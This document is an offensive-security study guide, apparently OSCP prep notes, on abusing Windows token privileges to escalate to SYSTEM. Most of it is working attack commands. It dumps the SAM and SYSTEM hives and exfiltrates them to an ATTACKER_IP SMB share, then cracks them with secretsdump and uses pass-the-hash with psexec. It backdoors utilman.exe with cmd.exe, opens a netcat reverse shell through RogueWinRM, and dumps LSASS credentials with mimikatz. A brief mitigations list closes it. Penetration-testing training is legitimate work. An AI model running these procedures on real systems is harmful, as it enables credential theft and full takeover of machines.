# Windows Token Privileges and Impersonation

Windows privileges are powerful rights assigned to user accounts that can be abused for privilege escalation. This document focuses on how to identify and exploit common Windows token privileges.

## Understanding Windows Privileges

Each Windows user has a set of assigned privileges that control what system-level operations they can perform. These privileges are independent of regular file/object permissions and can often be abused to escalate to higher access levels.

### Checking Privileges

To check the privileges assigned to your current token:

```cmd
whoami /priv
```

The output will show all privileges and their state (Enabled/Disabled). A privilege must typically be enabled to be used, but some exploits can enable disabled privileges.

## Exploitable Privileges

The most commonly abusable privileges include:

| Privilege | Description | Potential Abuse |
|-----------|-------------|-----------------|
| SeBackupPrivilege | Allows reading any file | Extract sensitive files (SAM, SYSTEM) |
| SeRestorePrivilege | Allows writing any file | Replace system files |
| SeTakeOwnershipPrivilege | Take ownership of any object | Replace system executables |
| SeImpersonatePrivilege | Impersonate clients | Use for token impersonation attacks |
| SeAssignPrimaryTokenPrivilege | Replace process token | Similar to impersonation |
| SeLoadDriverPrivilege | Load and unload drivers | Load malicious kernel drivers |
| SeDebugPrivilege | Debug any process | Access restricted processes, read memory |
| SeCreateTokenPrivilege | Create tokens | Create custom privileged tokens |

## SeBackup / SeRestore Exploitation

These privileges allow reading and writing to any file on the system, ignoring DACLs.

### Exploitation Steps

1. Verify privileges are present:
   ```cmd
   whoami /priv
   ```

2. Backup the SAM and SYSTEM registry hives:
   ```cmd
   reg save hklm\system C:\temp\system.hive
   reg save hklm\sam C:\temp\sam.hive
   ```

3. Transfer the hives to your attack machine using SMB or other methods:
   ```cmd
   # On attacker machine
   mkdir share
   python3 -m impacket.smbserver -smb2support -username user -password pass public share

   # On victim
   copy C:\temp\sam.hive \\ATTACKER_IP\public\
   copy C:\temp\system.hive \\ATTACKER_IP\public\
   ```

4. Extract password hashes using impacket:
   ```bash
   python3 -m impacket.secretsdump -sam sam.hive -system system.hive LOCAL
   ```

5. Use the hashes for Pass-the-Hash attacks:
   ```bash
   python3 -m impacket.psexec -hashes aad3b435b51404eeaad3b435b51404ee:HASH administrator@TARGET_IP
   ```

## SeTakeOwnership Exploitation

This privilege allows taking ownership of any object in the system.

### Exploitation Steps

1. Verify the privilege is present:
   ```cmd
   whoami /priv
   ```

2. Take ownership of a critical system file (e.g., utilman.exe):
   ```cmd
   takeown /f C:\Windows\System32\utilman.exe
   ```

3. Grant yourself full permissions:
   ```cmd
   icacls C:\Windows\System32\utilman.exe /grant YourUsername:F
   ```

4. Replace the file with a copy of cmd.exe:
   ```cmd
   copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
   ```

5. Lock the screen and click the "Ease of Access" button to spawn a SYSTEM shell

## SeImpersonate / SeAssignPrimaryToken Exploitation

These privileges allow a process to impersonate other users.

### How Token Impersonation Works

In Windows, services often need to perform actions on behalf of users. The impersonation privileges allow a service to "borrow" the access token of a connecting user:

1. User authenticates to a service
2. Service with impersonation privileges can use the user's token
3. Service can perform actions with the user's security context

### Common Vulnerable Accounts

* LOCAL SERVICE
* NETWORK SERVICE
* IIS Application Pool Identities (e.g., "iis apppool\defaultapppool")

### Exploitation with RogueWinRM

The RogueWinRM attack exploits the fact that the BITS service connects to port 5985 (WinRM) using SYSTEM privileges when started.

1. Verify impersonation privileges:
   ```cmd
   whoami /priv
   ```

2. Setup a listener on your attack machine:
   ```bash
   nc -lvp 4442
   ```

3. Run the RogueWinRM exploit:
   ```cmd
   RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   ```

4. When the BITS service starts, it will connect to your fake WinRM service, allowing you to impersonate the SYSTEM user

### Alternative: Potato Attacks

Several "Potato" attacks exist that abuse impersonation privileges:

* **JuicyPotato** - Works on Windows 7, 8, 10, Server 2008, and Server 2012
* **RoguePotato** - Works on newer systems with some adjustments
* **PrintSpoofer** - Exploits the Print Spooler service

Example with PrintSpoofer:
```cmd
PrintSpoofer.exe -i -c "cmd /c whoami > C:\temp\whoami.txt"
```

## SeDebug Exploitation

SeDebug allows you to debug any process, including those run by SYSTEM.

### Exploitation Steps

1. Verify the privilege is present:
   ```cmd
   whoami /priv
   ```

2. Use mimikatz to extract credentials from LSASS process:
   ```cmd
   privilege::debug
   sekurlsa::logonpasswords
   ```

3. Alternatively, dump the LSASS process and analyze offline:
   ```cmd
   procdump -ma lsass.exe lsass.dmp
   # Transfer to attacker machine
   # mimikatz: sekurlsa::minidump lsass.dmp + sekurlsa::logonpasswords
   ```

## Real-World Example: SeBackup / SeRestore

A server administrator created a "Backup Operators" group and added a user for backup purposes. This user had the SeBackup and SeRestore privileges.

1. Identify that we have the required privileges:
   ```cmd
   C:\> whoami /priv
   
   PRIVILEGES INFORMATION
   ----------------------
   
   Privilege Name                Description                    State
   ============================= ============================== ========
   SeBackupPrivilege             Back up files and directories  Disabled
   SeRestorePrivilege            Restore files and directories  Disabled
   ```

2. Exploit to extract registry hives:
   ```cmd
   C:\> reg save hklm\system C:\Users\BackupUser\system.hive
   The operation completed successfully.
   
   C:\> reg save hklm\sam C:\Users\BackupUser\sam.hive
   The operation completed successfully.
   ```

3. Extract hashes and gain access:
   ```bash
   # Extract hashes
   python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
   
   # Use the Administrator hash for Pass-the-Hash
   python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.10.10
   ```

## Mitigations

To protect against privilege abuse:

1. Limit the assignment of powerful privileges to only necessary users
2. Use Protected Process Light (PPL) for critical processes
3. Implement Just Enough Administration (JEA) for administrative tasks
4. Use Windows Defender Credential Guard to protect against credential theft
5. Regular audit privilege assignments with security baseline tools
6. Consider using AppLocker or similar to restrict execution of known exploitation tools

## OSCP Notes

For the OSCP exam, focus on the following privileges:
- SeBackup / SeRestore (registry hive extraction)
- SeTakeOwnership (system file replacement)
- SeImpersonate / SeAssignPrimaryToken (token impersonation attacks)

These attacks typically don't require complex tools, making them suitable for the exam environment. 